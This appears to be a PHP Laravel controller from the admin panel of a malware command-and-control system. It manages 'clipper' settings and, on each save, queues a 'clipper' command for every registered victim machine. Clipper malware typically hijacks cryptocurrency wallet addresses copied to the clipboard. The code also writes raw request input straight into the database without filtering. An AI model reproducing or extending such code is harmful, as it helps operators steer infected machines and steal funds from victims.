<?php

namespace App\Http\Controllers;

use App\Models\Clipper;
use App\Models\Command;
use App\Models\Machine;
use Illuminate\Http\Request;

class ClipperController extends Controller
{
    public function index()
    {
        return view('pages.clipper.index');
    }

    public function getItems()
    {
        $items = Clipper::all();

        foreach ($items as $item) {
            $item->edit_url = route('clipper.info', ['id' => $item->id]);
            $item->remove_url = route('clipper.remove', ['id' => $item->id]);
        }

        return datatables($items)->toJson();
    }

    public function getItem($id = null)
    {
        if (!$id) {
            return view('pages.clipper.item');
        }

        $item = Clipper::query()->where('id', $id)->first();

        if (!$item) {
            return redirect()->back();
        }

        return view('pages.clipper.item', compact('item'));
    }

    public function removeItem($id)
    {
        $item = Clipper::query()->where('id', $id)->first();

        if (!$item) {
            return redirect()->back();
        }

        $item->forceDelete();

        return redirect()->back();
    }

    public function createOrEditItem(Request $r)
    {
        if ($r->post('id')) {
            Clipper::where('id', $r->post('id'))->update($r->all());
        } else {
            Clipper::create($r->all());
        }

        $machines = Machine::all();

        foreach ($machines as $machine) {
            Command::query()->create([
                'machine_id' => $machine->id,
                'command' => json_encode([
                    'cmd' => 'clipper',
                    'uuid' => $machine->uuid,
                    'data' => []
                ])
            ]);
        }

        return redirect()->route('clipper');
    }
}
